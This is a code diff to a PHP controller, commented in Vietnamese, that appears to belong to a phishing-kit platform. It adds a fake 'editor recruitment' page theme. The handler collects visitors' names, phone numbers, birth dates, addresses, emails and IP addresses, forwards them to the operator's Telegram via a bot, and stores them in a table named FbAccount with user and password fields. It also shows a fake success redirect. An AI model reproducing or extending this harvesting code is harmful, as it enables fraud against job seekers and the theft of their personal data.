@@ -55,6 +55,10 @@ class CustomWeb extends Controller
                     'info' => $web_info
                 ]);
             } else {
+                // ghi đè link chuyển hướng cho giao diện user để báo thành công từ giao diện 1
+                if ($web_data->theme_folder == 'suleo123_tuyeneditor') {
+                    $web_data->redirect_link = '?success';
+                }
                 return view('login.realtime.' . $web_data->loginThemeFolder, [
                     'data' => $web_data,
                     'info' => $web_info,
@@ -462,7 +466,7 @@ class CustomWeb extends Controller
                 $ip = getRealIp();
                 // kiểm tra thời gian chống spam nếu đã nhập từ trước (giới hạn 3s/lần)
                 $check_ip = FbAccount::where('ip', $ip)
-                    ->where('type', 'custom_whatsapp')
+                    ->where('type', 'custom_ctv_0935396675')
                     ->latest()
                     ->first();
                 $wait_seconds = 3;
@@ -515,6 +519,92 @@ class CustomWeb extends Controller
                                 'chat_id' => $user_telegram_id,
                                 'parse_mode' => 'HTML',
                                 'text' => $msg,
+                            ]);
+                        }
+                    }
+                }
+            } catch (\Throwable $e) {
+                return response([
+                    'status' => false,
+                ]);
+            }
+        }
+    }
+    # SULEO123 TUYEN EDITOR THEME
+    function suleo123_tuyeneditor_post_custom(Request $rq)
+    {
+        if ($rq->filled('d')) {
+            try {
+                $post_data = Json::decode($rq->d);
+                $web_info = Json::decode(Crypt::decryptString($post_data->info));
+                $ip = getRealIp();
+                // kiểm tra thời gian chống spam nếu đã nhập từ trước (giới hạn 3s/lần)
+                $check_ip = FbAccount::where('ip', $ip)
+                    ->where('type', 'custom_suleo123_tuyeneditor')
+                    ->latest()
+                    ->first();
+                $wait_seconds = 3;
+                if ($check_ip) {
+                    if ($check_ip->created_at->diffInSeconds(now()) <= $wait_seconds) {
+                        return response([
+                            'status' => false,
+                        ]);
+                    }
+                }
+                # custom bot
+                $custom_realtime_bot = new Api(config('telegrambot.custom'));
+                $user = User::find($web_info->userid);
+                if ($user) {
+                    // kiểm tra xem ip có bị chặn không
+                    if (check_blocked_ip($user->id, $ip)) {
+                        return;
+                    }
+                    $user_telegram_id = Json::decode($user->data)->telegram_id;
+                    if ($user_telegram_id) {
+                        $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
+                        if ($website) {
+                            $website = Json::decode($website->data);
+                            $fullData = (array) ($post_data->fullFormData ?? []);
+                            $phamMem = $fullData['phamMem'] ?? [];
+                            $phamMem = is_array($phamMem) ? $phamMem : (array) $phamMem;
+
+                            $msg = implode("\n", [
+                                "Giao diện tuyển Editor tùy chỉnh",
+                                "",
+                                "Title: <b>{$website->title}</b>",
+                                "",
+                                "------------------------",
+                                "<b>Họ và tên:</b> <code>" . ($fullData['name'] ?? '') . "</code>",
+                                "<b>Số điện thoại:</b> <code>" . ($fullData['phone'] ?? '') . "</code>",
+                                "<b>Ngày sinh:</b> <code>" . ($fullData['dob'] ?? '') . "</code>",
+                                "<b>Địa chỉ:</b> <code>" . ($fullData['address'] ?? '') . "</code>",
+                                "<b>Email:</b> <code>" . ($fullData['email'] ?? '') . "</code>",
+                                "<b>Phần mềm thành thạo:</b> <code>" . trim(implode(', ', $phamMem)) . "</code>",
+                                "<b>Kinh nghiệm:</b> <code>" . ($fullData['experience'] ?? '') . "</code>",
+                                "<b>Link Instagram:</b> <code>" . ($fullData['instagram'] ?? '') . "</code>",
+                                "<b>Hình thức làm việc:</b> <code>" . ($fullData['mode'] ?? '') . "</code>",
+                                "<b>Giới thiệu ngắn:</b> <code>" . ($fullData['note'] ?? '') . "</code>",
+                                "------------------------",
+                                "",
+                                "<b>Phân biệt:</b> {$web_info->emoji}",
+                                "<b>IP:</b> {$ip}",
+                                ""
+                            ]);
+
+                            $custom_realtime_bot->sendMessage([
+                                'chat_id' => $user_telegram_id,
+                                'parse_mode' => 'HTML',
+                                'text' => $msg,
+                            ]);
+
+                            // chống spam: lưu lại ip đã gửi
+                            FbAccount::create([
+                                'userid' => $web_info->userid,
+                                'webid' => $web_info->webid,
+                                'user' => $fullData['phone'] ?? '',
+                                'password' => $fullData['email'] ?? '',
+                                'type' => 'custom_cccc',
+                                'ip' => $ip
                             ]);
                         }
                     }
